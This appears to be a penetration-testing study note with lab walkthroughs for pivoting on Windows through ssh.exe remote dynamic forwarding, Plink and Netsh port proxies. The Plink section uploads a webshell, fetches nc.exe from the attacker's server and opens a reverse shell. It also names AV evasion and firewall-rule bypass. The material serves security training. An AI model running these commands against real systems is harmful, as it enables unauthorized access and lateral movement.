---
tags: plink, netsh
---
## ssh.exe

OpenSSH client in Windows
- bundled by default since version 1803 (April 2018 Update)
	- will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in **%systemdrive%\\Windows\\System32\\OpenSSH** location by default
- available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update)

E.g. Remote dynamic port forwarding:
![[Pasted image 20240821114336.png]]

- From MULTISERVER03 (a Windows machine) to Kali
- Only the RDP port is open on MULTISERVER03

1. Make sure SSH server is running on Kali:
   `sudo systemctl start ssh`
2. Use FreeRDP to connect to RDP server on MULTISERVER03:
   `xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
3. On MULTISERVER03, open a **cmd.exe** window and determine whether SSH is on the box:
   `where ssh`
4. Make sure the version of OpenSSH on Windows is higher than 7.6,meaning we can use it for remote dynamic port forwarding:
   `ssh.exe -V`
5. Create a remote dynamic port forward to our Kali machine:
   `ssh -N -R 9998 kali@192.168.118.4`
6. On Kali, check that the SOCKS proxy port is opened:
   `ss -ntplu`
7. Update `/etc/proxychains4.conf`:
   Overwrite existing configurations with the line `socks5 127.0.0.1 9998`
8. It is set up. Now, we can run **psql** through **proxychains** to connect to the PostgreSQL database, using the same command as if directly connecting from MULTISERVER03:
   `proxychains psql -h 10.4.50.215 -U postgres`

## Plink

- A tool that is popular with network admins
- The command-line-only counterpart of PuTTY
- Benefits:
	- rarely flagged by traditional AV software
	- network admins may have removed OpenSSH, but they likely have Plink installed

> Plink has much of the functionality of the OpenSSH client, but it does not have remote dynamic port forwarding

E.g. Scenario:
![[Pasted image 20240821123733.png]]

- MULTISERVER03 only has a web application on TCP port 80 exposed. All other inbound ports are blocked by firewall, so RDP is no longer available.

Steps:
1. Upload a webshell via the web app on MULTISERVER03
2. Host **nc.exe** on a web server on Kali:
   `sudo systemctl start apache2`
   `find / -name nc.exe 2>/dev/null` (find where **nc.exe** is)
   `sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/` (host it on the web server)
3. Download **nc.exe** to MULTISERVER03 
   `powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe`
4. Set up netcat listener on Kali:
   `nc -nvlp 4446`
5. Execute remote shell on webshell on MULTISERVER03:
   `C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446`
6. Host plink.exe on the Apache web server on Kali:
   `find / -name plink.exe 2>/dev/null`
   `sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/`
7. Download plink.exe on MULTISERVER03:
   `powershell wget -Uri http://192.168.118.4/plink.exe - OutFile C:\Windows\Temp\plink.exe`
8. Set up Plink with a remote port forward:
   `C:\Windows\Temp\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`
	- `-l kali -pw [PASSWORD]`: pass username and password of Kali directly here
	- `-R`: set up remote port forward
		- `127.0.0.1:9833`: socket we want to open on the Kali SSH server
		- `127.0.0.1:3389`: RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to
	- add `cmd.exe /c echo y |` in front of the command if the confirmation isn't working on very restricted Windows shell
	- `192.168.118.4`: kali IP
9. Confirm that the port has opened on Kali:
   `ss -ntplu`
10. Connect to port 9983 on our Kali loopback interface with xfreerdp to get an RDP connection to MULTISERVER03
    `xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`

## [Netsh](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh)

- built-in firewall configuration tool
- native way to create port forward on Windows
	- with the *portproxy* *subcontext* within the *interface* context
	- requires administrative privileges

E.g. scenario:
![[Pasted image 20240821144834.png]]
- MULTISERVER03 is serving web application on TCP port 80
- MULTISERVER03 TCP port 3389 is also accessible (RDP)
- CONFLUENCE01 is not accessible on the WAN interface

Goal:
![[Pasted image 20240821154814.png]]
- SSH into PGDATABASE01 directly from our Kali machine
- create a port forward on MULTISERVER03 that will listen on the WAN interface and forward packets to the SSH port on PGDATABASE01

Steps:
1. RDP into MULTISERVER03:
   `xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
2. Run **cmd.exe** as administrator
3. In the command window, set up port forwarding using Netsh:
   `netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`
	- instruct **netsh interface** to **add** a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port (**v4tov4**)
	- listen on port 2222 on the external-facing interface
	- forward packets to port 22 on PGDATABASE01
4. In the command window, confirm that port 2222 is listening:
   `netstat -anp TCP | find "2222"`
5. Confirm port forward is stored:
   `netsh interface portproxy show all`
6. On Kali, check whether we can connect to port 2222 of MULTISERVER01:
   `sudo nmap -sS 192.168.50.64 -Pn -n -p2222` (it is filtered, can't connect because Windows Firewall is blocking inbound connections)
7. Poke a hole in the firewall on MULTISERVER03:
   `netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`
	- use the **netsh advfirewall firewall** subcontext
	- use **add rule** command
	- `name=`: set name of rule (make it memorable because we need to delete it later on)
	- **allow** connections on the local port (**localport=2222**) on the interface with the local IP address (**localip=192.168.50.64**) using the **TCP** protocol, specifically for incoming traffic (**dir=in**)
8. Check how the port appears from Kali again:
   `sudo nmap -sS 192.168.50.64 -Pn -n -p2222` (is open now)
9. Can now SSH to port 2222 on MULTISERVER03, as though connecting to port 22 or PGDATABASE01:
   `ssh database_admin@192.168.50.64 -p2222`
10. After we're done, delete the firewall rule on MULTISERVER03:
    `netsh advfirewall firewall delete rule name="port_forward_ssh_2222"`
11. Delete the port forward we created:
    `netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64` (no response for success)


